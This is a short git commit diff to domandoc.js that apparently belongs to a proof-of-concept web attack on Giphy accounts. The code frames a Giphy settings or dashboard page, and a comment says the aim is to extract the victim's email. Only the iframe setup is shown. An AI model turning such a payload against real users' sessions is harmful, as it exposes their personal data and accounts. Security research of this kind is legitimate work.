26ae4c7bf38fb06318daa01d65b054967ada009e
naysser <77415898+naysser@users.noreply.github.com>
2021-08-22 16:40:37 +0200

    Update domandoc.js

--- domandoc.js
+++ domandoc.js
@@ -1,6 +1,6 @@
 setTimeout(function() {
     var profileIframe = document.createElement('iframe');
-    profileIframe.setAttribute('src', 'https://giphy.com/settings/');
+    profileIframe.setAttribute('src', 'https://developers.giphy.com/dashboard/');
     profileIframe.setAttribute('id', 'pi');
     document.body.appendChild(profileIframe);
     //Extract their email as PoC
